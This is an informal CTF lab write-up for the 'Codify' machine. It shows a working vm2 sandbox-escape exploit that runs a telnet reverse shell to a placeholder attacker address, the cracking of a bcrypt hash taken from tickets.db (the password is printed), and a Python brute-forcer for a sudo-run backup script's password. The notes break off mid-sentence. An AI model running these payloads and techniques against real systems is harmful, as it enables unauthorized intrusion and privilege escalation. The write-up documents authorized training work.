# Notes
### IP:
10.10.11.239

### Difficulty:
Easy

### User flag:

### Root flag:



# Nmap scan:
`nmap -sV -p- 10.10.11.239 `

gives us:

```
PORT     STATE SERVICE VERSION                                 
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu 
Linux; protocol 2.0)                                           
80/tcp   open  http    Apache httpd 2.4.52                     
3000/tcp open  http    Node.js Express framework               
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:li
nux_kernel
```

There is a code editor on the website http://codify.htb/editor.
![[Pasted image 20231107000126.png]]

Looking behind the scenes we find this javascript code:

```javascript
const code = document.getElementById('code').value;
      const encodedCode = btoa(code);
      fetch('/run', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ code: encodedCode })
      })
        .then(response => response.json())
        .then(data => {
          const output = document.getElementById('output');
          if (data.error) {
            output.innerHTML = `<textarea  rows="10" cols="50" class="form-control h-100" style="color: red;">Error: ${data.error}</textarea>`;
          } else {
            output.innerHTML = `<textarea  rows="10" cols="50" class="form-control h-100" style="color: green;">${data.output}</textarea>`;
          }
        })
        .catch(error => {
          console.error(error);
          const output = document.getElementById('output');
          output.innerHTML = `<div style="color: red;">Error: ${error.message}</div>`;
        });
    }
```

It sends a a post request to http://codify.htb/run after having base64 encoded the input of the user. Looking at the post request deeper, it looks like this:

```
POST /run HTTP/1.1

(a bunch of headers)

{
"code":"bGV0IGFzZGYgPSAic2FkZmciCmNvbnNvbGUubG9nKGFzZGYp"
}
```

Hmm, no matter what I did I could not get any remote code execution to work let's keep this on the backburner while we keep enumerating. 

# RCE with VM2

Going to the About page presents us with this. 
![[Pasted image 20231107014648.png]]Googling what VM2 is allows us to find a billion RCE CVE's with level critical. It's kind of funny how insanely vulnerable this library is haha.

I'm just going to copy paste some code from this PoC https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244 and use a telnet reverse shell so our code ends up looking like this:
```js
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('TF=$(mktemp -u);mkfifo $TF && telnet {IP ADDRESS} {PORT} 0<$TF | sh 1>$TF');
}
```

Setting up a listener and...
![[Pasted image 20231107015133.png]]
### We're in.

However we're the svc user so we cannot get the user flag just yet.

# Privilege escalation 

First thing we can do is spawn a shell with: `python3 -c 'import pty; pty.spawn("/bin/sh")'

Now, first thing we can do is go in the /var/www/ folder. Snooping around in here finds us the tickets.db file. Catting that out and...

`Gjoshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2`
### bingo!

We just need to crack that password with john and we're good to go.
`john joshua.hash -w=/usr/share/wordlists/rockyou.txt` where joshua.hash is `$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2` gives us the following password `spongebob1` what an absolutely amazing password.

All we need to do now is ssh into the machine with the password and we're in and can cat out the user.txt file.

# Getting root flag

As joshua doing sudo -l gives us this file `(root) /opt/scripts/mysql-backup.sh` that we can run as root. However when we run it as root we 

```python
import string  
import subprocess  
all = list(string.ascii_letters + string.digits)  
password = ""  
found = False  
  
while not found:  
for character in all:  
command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"  
output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout  
  
if "Password confirmed!" in output:  
password += character  
print(password)  
break  
else:  
found = True
```
